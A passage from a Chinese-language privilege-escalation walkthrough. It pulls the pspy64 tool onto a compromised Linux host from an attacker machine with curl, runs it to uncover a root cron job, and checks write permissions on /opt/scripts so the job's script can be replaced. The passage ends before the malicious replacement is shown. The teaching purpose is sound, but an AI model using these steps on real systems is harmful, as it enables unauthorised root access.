<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /dev/shm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.30/pspy64 -o pspy64</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>接下来，我们需要赋予二进制执行权限。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">chmod 755 ./pspy64</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113546809-1597379335-d8fc48d4b090809dec1f5b5d6cd26fb2.png" width="650" height="156" class="img_ev3q"></p>
<p>现在该工具已可供使用，我们可以执行它并等待查看是否出现任何有趣的流量。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113548703-1078223704-74094039f4eabe704e00f8625a71c5e1.png" width="1024" height="279" class="img_ev3q"></p>
<p>几分钟后，我们不仅可以清楚地看到 cron 作业每分钟都在运行，而且它还以 root 身份运行！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113645676-925409070-409d0432e6fe68267590bdb54190d653.png" width="823" height="379" class="img_ev3q"></p>
<p>太棒了！使用 pspy 我们能够找到正在运行的 “隐藏 cron 作业”。</p>
<p>现在我们已经找到了我们正在寻找的东西，我们可以使用CTRL + C退出 pspy 。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="83确定如何利用-cron-job"><strong><div id="id8.3">8.3、确定如何利用 Cron Job</div></strong><a href="#83确定如何利用-cron-job" class="hash-link" aria-label="83确定如何利用-cron-job的直接链接" title="83确定如何利用-cron-job的直接链接">​</a></h4>
<p>发现受害者正在运行 cron 作业后，下一步就是检查目录和脚本本身的权限。</p>
<p>首先，我们应该检查脚本执行所在的 <strong>/opt/scripts</strong> 目录的权限。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -l /opt | grep &quot;scripts&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="430" height="46" class="img_ev3q"></p>
<p>太棒了！我们发现我们对 <strong>/opt/scripts</strong> 目录具有写权限！</p>
<p>接下来，我们还应该检查文件的所有者，看看是否可以直接编辑。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -l /opt/scripts | grep &quot;test-connect.sh&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113619517-768297694-84b3c3f4b3eb6832cd6fc7e6b926f5e5.png" width="590" height="76" class="img_ev3q"></p>
<p>由于我们对目录具有写权限而对文件没有写权限，因此我们无法像之前那样编辑脚本！</p>
<p>通过这一发现，我们确定利用这个 cron 作业的唯一方法是用恶意脚本替换该脚本。</p>
<blockquote>
<p>实际上，我们有一种方法可以写入脚本。移动文件时会发生一些有趣的事情，我们将在后面看到。</p>
</blockquote>
<p>接下来，让我们快速检查一下脚本正在做什么。</p>
